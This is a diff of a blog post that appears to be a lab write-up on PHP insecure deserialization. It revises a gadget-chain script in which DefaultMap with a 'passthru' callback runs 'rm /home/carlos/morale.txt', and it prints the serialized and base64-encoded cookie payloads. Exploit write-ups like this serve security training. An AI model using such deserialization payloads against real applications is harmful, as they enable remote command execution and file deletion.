@@ -238,10 +238,9 @@ You can sometimes read source code by appending a tilde (~) to a filename to ret
 
 <p>which is exactly what we want and is the same as the third line of our code above: <code class="language-plaintext highlighter-rouge">$test-&gt;$command;</code> which results in our arbitrary code being executed.</p>
 
-<p>I have created a php file to create the final payload with just the parts of the leaked code that are necessary for creating the payload:</p>
+<p>I have prepared a php file for creating the final payload with just the parts of the leaked code that are necessary for creating the payload:</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="cp">&lt;?php</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 
 <span class="kd">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
     <span class="k">private</span> <span class="nv">$default_desc_type</span><span class="p">;</span>
@@ -250,34 +249,14 @@ You can sometimes read source code by appending a tilde (~) to a filename to ret
     <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DefaultMap</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">);</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span> <span class="o">=</span> <span class="s1">'rm /home/carlos/morale.txt'</span><span class="p">;</span>
-
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">build_product</span><span class="p">();</span>
-    <span class="p">}</span>
-
-
-    <span class="k">private</span> <span class="k">function</span> <span class="n">build_product</span><span class="p">()</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">product</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Product</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
-
-<span class="kd">class</span> <span class="nc">Product</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$desc</span><span class="p">;</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$default_desc_type</span><span class="p">,</span> <span class="nv">$desc</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="nv">$desc</span><span class="o">-&gt;</span><span class="nv">$default_desc_type</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
 
 <span class="kd">class</span> <span class="nc">DefaultMap</span> <span class="p">{</span>
     <span class="k">private</span> <span class="nv">$callback</span><span class="p">;</span>
 
     <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="n">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
 
@@ -293,17 +272,15 @@ You can sometimes read source code by appending a tilde (~) to a filename to ret
 
 <p>and the output of this code is:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'rm' is not recognized as an internal or external command,
-operable program or batch file.
-O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}s:7:"product";O:7:"Product":1:{s:4:"desc";N;}}
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
 ===================================================
 base64 endcoded then urlencoded:
-TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fXM6NzoicHJvZHVjdCI7Tzo3OiJQcm9kdWN0IjoxOntzOjQ6ImRlc2MiO047fX0%3D
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
 </code></pre></div></div>
 
-<p>Ignore the error, it shows that <code class="language-plaintext highlighter-rouge">passthru</code> was really executed which is a good sign, also keep in mind that the php serialized object is a binary format meaning it may contain some null characters… so if we copy-paste the cleartext part from the above output:</p>
+<p>Keep in mind that the php serialized object is a binary format meaning it may contain some null characters… so if we copy-paste the cleartext part from the above output:</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="s2">"CustomTemplatedefault_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"CustomTemplatedesc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"DefaultMapcallback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"passthru"</span><span class="p">;}</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"product"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"Product"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"desc"</span><span class="p">;</span><span class="nc">N</span><span class="p">;}}</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="s2">"CustomTemplatedefault_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"CustomTemplatedesc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"DefaultMapcallback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"passthru"</span><span class="p">;}}</span>
 </code></pre></div></div>
 
 <p>It won’t work, if we want to copy-paste the cleartext version, we need to edit it manually and the final payload will be something like this:</p>
@@ -320,7 +297,7 @@ rather than a CHAR or TEXT field.
 
 <p>That’s why we base64 and url encoded the output to easily be able to copy-paste it as the session cookie. So we copy this part from the output above:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fXM6NzoicHJvZHVjdCI7Tzo3OiJQcm9kdWN0IjoxOntzOjQ6ImRlc2MiO047fX0%3D
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
 </code></pre></div></div>
 
 <p>and paste it here in the session cookie in the Burp suite repeater:</p>
